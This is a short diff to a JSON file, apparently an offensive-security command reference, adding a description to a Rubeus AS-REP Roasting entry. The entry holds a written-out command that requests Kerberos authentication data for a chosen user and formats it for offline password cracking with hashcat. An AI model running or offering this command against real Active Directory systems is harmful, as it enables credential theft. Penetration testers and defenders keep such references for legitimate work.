@@ -206,7 +206,8 @@
   "variations": [
     {
       "label": "Specific user",
-      "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap"
+      "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap",
+      "description": "Uses Rubeus to perform AS-REP Roasting - identifies and requests authentication data for accounts without pre-authentication. The output can be cracked offline to recover passwords."
     }
   ],
   "steps": [
